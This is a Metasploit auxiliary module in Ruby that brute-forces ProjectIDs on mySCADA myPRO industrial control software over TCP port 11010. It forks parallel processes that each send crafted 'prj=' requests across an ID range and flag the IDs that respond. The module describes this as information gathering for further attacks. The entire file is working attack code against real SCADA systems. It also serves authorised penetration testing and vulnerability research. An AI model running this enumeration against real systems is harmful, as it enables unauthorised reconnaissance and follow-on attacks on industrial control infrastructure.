##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'mySCADA myPRO ProjectID Disclosure',
      'Description'    => %q{
        This module gathers information from mySCADA myPRO application to find the projectID to use it further attacks.
      },
      'Author'         => [ 'Emre OVUNC <info[at]emreovunc.com' ],
      'License'        => MSF_LICENSE,
      'References'     => [
			    ['URL', 'https://github.com/EmreOvunc/mySCADA-myPRO-7-projectID-Disclosure'],
 			    ['URL', 'https://emreovunc.com/blog/en/mypro_enum_projectid.rb']
			  ],
      'DefaultOptions' =>
        		  {
          		     'RPORT'        => 11010
        		  }

    ))
    register_options(
    [
      OptString.new("PROCESS", [true, "Number of processes", 10]),
      OptString.new("MAX_ID", [true, "Max. ProjectID to stop enumeration", 875000]),
      OptString.new("MIN_ID", [true, "Min. ProjectID to start enumeration", 870000])
    ])

  end

  def run
    start   = 0
    pool    = []
    target  = datastore['RHOST']
    rport   = datastore['RPORT']
    maxid   = datastore['MAX_ID']
    minid   = datastore['MIN_ID']
    processes = datastore['PROCESS']
    print_status("Processes are starting...")
    range   = (maxid.to_i - minid.to_i) / processes.to_i
    while start < processes.to_i do
        pool << fork {socketx(minid, minid.to_i + range, start)}
        start += 1
        minid = minid.to_i + range
        sleep(0.01)
    end
    print_status('Waiting all processes...')
    pool.each { |proc|  Process.waitpid(proc) }
  end

  def socketx(minid, maxid, start)
    buf = ''
	  begin
		  connect
    	payload = 't=0&rq=0&prj='
		  while minid.to_i <= maxid.to_i do
        tmp = payload + minid.to_s
  		  sock.put(tmp)
 		    buf = sock.get_once || ""
        if not buf.include? 'err'
          print_good('ProjectID Found: ' + minid.to_s + ' !')
        end
        minid = minid.to_i + 1
		  end
	  end
  end
end
